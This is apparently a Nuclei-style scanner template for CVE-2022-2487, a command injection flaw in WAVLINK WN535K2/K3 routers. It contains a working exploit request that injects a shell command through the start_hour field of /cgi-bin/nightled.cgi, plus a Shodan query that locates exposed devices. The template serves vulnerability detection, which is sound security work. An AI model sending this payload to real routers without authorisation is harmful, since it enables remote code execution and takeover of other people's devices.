id: CVE-2022-2487
info:
  author: For3stCo1d
  classification:
    cve-id: CVE-2022-2487
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-78
  description: 'A vulnerability has been found in WAVLINK WN535K2 and WN535K3 and
    classified as critical. This vulnerability affects unknown code of the file /cgi-bin/nightled.cgi.
    The manipulation of the argument start_hour leads to os command injection. The
    exploit has been disclosed to the public and may be used.

    '
  metadata:
    shodan-query: http.title:"Wi-Fi APP Login"
    verified: 'true'
  name: Wavlink Nightled.cgi - Remote Code Execution
  reference:
  - https://github.com/1angx/webray.com.cn/blob/main/Wavlink/Wavlink%20nightled.cgi%20.md
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-2487
  - https://vuldb.com/?id.204538
  severity: critical
  tags: cve,cve2022,iot,wavlink,router,rce,oast
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - uid=
    - gid=
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - '@timeout: 10s

    POST /cgi-bin/nightled.cgi HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    page=night_led&start_hour=;{{cmd}};

    '
variables:
  cmd: id
